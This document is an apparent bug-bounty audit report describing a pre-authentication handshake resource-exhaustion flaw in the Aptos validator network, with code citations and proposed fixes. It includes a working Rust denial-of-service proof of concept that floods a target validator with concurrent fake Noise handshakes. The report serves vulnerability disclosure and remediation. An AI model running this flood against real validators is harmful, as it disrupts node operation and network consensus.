# Audit Report

## Title
Validator Network DoS via Unbounded Pre-Authentication Handshake Resource Exhaustion

## Summary
The validator network is configured by default to listen on all public interfaces (0.0.0.0), and the network layer lacks pre-authentication rate limiting for Noise handshake connections. Attackers can exhaust validator resources by forcing expensive cryptographic operations before authentication checks occur, leading to validator slowdowns and potential consensus disruption.

## Finding Description

The vulnerability consists of three interconnected issues:

**1. Public Interface Exposure**

The default validator configuration exposes the validator network on all interfaces: [1](#0-0) 

The `validator_network` field at line 89 accepts any `NetworkAddress` with no validation that it's bound to a private interface: [2](#0-1) 

**2. Unbounded Pre-Authentication Handshake Queue**

The `TransportHandler` accepts inbound connections into an unbounded `FuturesUnordered` collection: [3](#0-2) 

There is no limit on the number of concurrent handshake upgrade tasks in `pending_inbound_connections`, allowing unlimited simultaneous Noise handshakes.

**3. Expensive Pre-Authentication Cryptography**

Each inbound connection performs expensive Diffie-Hellman operations BEFORE authentication: [4](#0-3) 

These cryptographic operations occur at line 361-364 during `parse_client_init_message`, which happens BEFORE the mutual authentication check at lines 369-427. For mutual auth mode, untrusted peers are only rejected AFTER these expensive operations complete.

**4. Post-Handshake Connection Limiting**

The `inbound_connection_limit` check only applies AFTER the complete handshake finishes: [5](#0-4) 

**Attack Flow:**
1. Attacker opens many TCP connections to validator's public IP on port 6180
2. Each connection enters the handshake upgrade process with no pre-authentication limit
3. Validator performs expensive Noise IK handshake operations (DH key exchange) for each connection
4. Each handshake can run for up to 30 seconds before timeout: [6](#0-5) 

5. Only after handshake completion are untrusted peers rejected or connection limits enforced
6. Validator CPU/memory resources are exhausted handling concurrent handshakes

## Impact Explanation

This qualifies as **High Severity** under the Aptos bug bounty program criteria for "Validator node slowdowns." 

Specific impacts:
- **CPU Exhaustion**: Each Noise handshake requires expensive elliptic curve Diffie-Hellman operations, consuming significant CPU resources
- **Memory Exhaustion**: Unbounded `pending_inbound_connections` allows unlimited concurrent handshake futures, each consuming memory
- **Consensus Disruption**: Validator slowdowns delay vote submission and block proposal, potentially causing missed rounds and reduced network performance
- **Cascading Effect**: Multiple validators under attack simultaneously could significantly degrade network liveness

While mutual authentication prevents unauthorized peers from joining the validator network post-handshake, the resource exhaustion occurs before authentication completes, making it an effective DoS vector.

## Likelihood Explanation

**Likelihood: High**

- **Low Attacker Requirements**: Requires only network access to the validator's public IP, no credentials or insider access
- **Simple Exploitation**: Attack can be executed with a basic TCP client sending Noise handshake initiation messages
- **Default Configuration**: Validators use the vulnerable configuration (0.0.0.0 binding) by default
- **No Rate Limiting**: No pre-authentication rate limiting protects against this attack
- **Easily Discoverable**: Validator IPs and ports are publicly known through on-chain discovery

## Recommendation

Implement multi-layered defenses:

**1. Enforce Private Interface Binding (Configuration Validation)**
Add a config sanitizer that warns or rejects validator networks bound to public interfaces:

```rust
// In config/src/config/config_sanitizer.rs
fn sanitize_validator_network_config(...) -> Result<(), Error> {
    // ... existing checks ...
    
    if let Some(validator_network_config) = validator_network {
        // Check if listening on all interfaces (0.0.0.0 or ::)
        let listen_addr = &validator_network_config.listen_address;
        if listen_addr.to_string().contains("/ip4/0.0.0.0/") 
            || listen_addr.to_string().contains("/ip6/::/") {
            return Err(Error::ConfigSanitizerFailed(
                sanitizer_name,
                "Validator network should not listen on all interfaces (0.0.0.0). \
                 Bind to a specific private interface instead.".into(),
            ));
        }
    }
    Ok(())
}
```

**2. Add Pre-Authentication Connection Limits**
Limit the number of concurrent pending handshakes:

```rust
// In network/framework/src/peer_manager/transport.rs
const MAX_PENDING_HANDSHAKES: usize = 100;

pub async fn listen(mut self) {
    let mut pending_inbound_connections = FuturesUnordered::new();
    // ...
    
    loop {
        futures::select! {
            // ...
            inbound_connection = self.listener.select_next_some() => {
                // Check pending handshake limit
                if pending_inbound_connections.len() >= MAX_PENDING_HANDSHAKES {
                    warn!("Rejecting inbound connection: pending handshake limit reached");
                    counters::connections_rejected(&self.network_context, ConnectionOrigin::Inbound).inc();
                    continue;
                }
                
                if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                    pending_inbound_connections.push(fut);
                }
            },
            // ...
        }
    }
}
```

**3. Add Early Abort for Unknown Peers in Mutual Auth**
Check peer membership BEFORE expensive crypto operations:

```rust
// In network/framework/src/noise/handshake.rs upgrade_inbound
// After parsing remote_peer_id but BEFORE parse_client_init_message:

if let HandshakeAuthMode::Mutual { peers_and_metadata, .. } = &self.auth_mode {
    let trusted_peers = peers_and_metadata.get_trusted_peers(&network_id)?;
    if !trusted_peers.contains_key(&remote_peer_id) {
        return Err(NoiseHandshakeError::UnauthenticatedClient(
            remote_peer_short,
            remote_peer_id,
        ));
    }
}

// Then proceed with parse_client_init_message...
```

## Proof of Concept

```rust
// DoS PoC: Exhaust validator resources via concurrent handshakes
use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;
use futures::future::join_all;

#[tokio::main]
async fn main() {
    let validator_ip = "VALIDATOR_IP:6180"; // Replace with target validator
    let num_connections = 1000; // Far exceeds typical connection limits
    
    println!("Initiating DoS attack with {} connections...", num_connections);
    
    // Launch many concurrent connections
    let mut tasks = vec![];
    for i in 0..num_connections {
        let task = tokio::spawn(async move {
            match TcpStream::connect(validator_ip).await {
                Ok(mut stream) => {
                    // Send a malformed but valid-looking Noise handshake init
                    // This forces the validator to attempt parsing and DH operations
                    let mut fake_handshake = vec![0u8; 128]; // Approximate handshake size
                    
                    // Fill with pseudo-random data to look like a real handshake
                    for (idx, byte) in fake_handshake.iter_mut().enumerate() {
                        *byte = (idx % 256) as u8;
                    }
                    
                    if let Err(e) = stream.write_all(&fake_handshake).await {
                        eprintln!("Connection {} write failed: {}", i, e);
                    }
                    
                    // Keep connection alive to consume resources
                    tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
                },
                Err(e) => eprintln!("Connection {} failed: {}", i, e),
            }
        });
        tasks.push(task);
        
        // Small delay to avoid overwhelming local network
        tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
    }
    
    // Wait for all attacks to complete
    join_all(tasks).await;
    println!("Attack complete. Validator should show degraded performance.");
}
```

**To verify the vulnerability:**
1. Deploy a validator with default config (listening on 0.0.0.0:6180)
2. Run the PoC from an external network
3. Monitor validator metrics: `pending_connection_upgrades` will spike, CPU usage will increase
4. Observe validator consensus participation delays during the attack

**Notes:**
- While mutual authentication prevents unauthorized network membership, it does not prevent pre-authentication resource exhaustion
- The TCP listener backlog (256) provides minimal protection but is quickly exhausted
- Real-world validators exposed to the internet are vulnerable to this attack
- Defense-in-depth requires both configuration hardening and code-level rate limiting

### Citations

**File:** config/src/config/test_data/validator.yaml (L40-42)
```yaml
validator_network:
    discovery_method: "onchain"
    listen_address: "/ip4/0.0.0.0/tcp/6180"
```

**File:** config/src/config/node_config.rs (L88-89)
```rust
    #[serde(default)]
    pub validator_network: Option<NetworkConfig>,
```

**File:** network/framework/src/peer_manager/transport.rs (L90-109)
```rust
    pub async fn listen(mut self) {
        let mut pending_inbound_connections = FuturesUnordered::new();
        let mut pending_outbound_connections = FuturesUnordered::new();

        debug!(
            NetworkSchema::new(&self.network_context),
            "{} Incoming connections listener Task started", self.network_context
        );

        loop {
            futures::select! {
                dial_request = self.transport_reqs_rx.select_next_some() => {
                    if let Some(fut) = self.dial_peer(dial_request) {
                        pending_outbound_connections.push(fut);
                    }
                },
                inbound_connection = self.listener.select_next_some() => {
                    if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                        pending_inbound_connections.push(fut);
                    }
```

**File:** network/framework/src/noise/handshake.rs (L361-364)
```rust
        let (remote_public_key, handshake_state, payload) = self
            .noise_config
            .parse_client_init_message(prologue, client_init_message)
            .map_err(|err| NoiseHandshakeError::ServerParseClient(remote_peer_short, err))?;
```

**File:** network/framework/src/peer_manager/mod.rs (L352-388)
```rust
        if conn.metadata.origin == ConnectionOrigin::Inbound {
            // Everything below here is meant for unknown peers only. The role comes from
            // the Noise handshake and if it's not `Unknown` then it is trusted.
            if conn.metadata.role == PeerRole::Unknown {
                // TODO: Keep track of somewhere else to not take this hit in case of DDoS
                // Count unknown inbound connections
                let unknown_inbound_conns = self
                    .active_peers
                    .iter()
                    .filter(|(peer_id, (metadata, _))| {
                        metadata.origin == ConnectionOrigin::Inbound
                            && trusted_peers
                                .get(peer_id)
                                .is_none_or(|peer| peer.role == PeerRole::Unknown)
                    })
                    .count();

                // Reject excessive inbound connections made by unknown peers
                // We control outbound connections with Connectivity manager before we even send them
                // and we must allow connections that already exist to pass through tie breaking.
                if !self
                    .active_peers
                    .contains_key(&conn.metadata.remote_peer_id)
                    && unknown_inbound_conns + 1 > self.inbound_connection_limit
                {
                    info!(
                        NetworkSchema::new(&self.network_context)
                            .connection_metadata_with_address(&conn.metadata),
                        "{} Connection rejected due to connection limit: {}",
                        self.network_context,
                        conn.metadata
                    );
                    counters::connections_rejected(&self.network_context, conn.metadata.origin)
                        .inc();
                    self.disconnect(conn);
                    return;
                }
```

**File:** network/framework/src/transport/mod.rs (L40-41)
```rust
/// A timeout for the connection to open and complete all of the upgrade steps.
pub const TRANSPORT_TIMEOUT: Duration = Duration::from_secs(30);
```
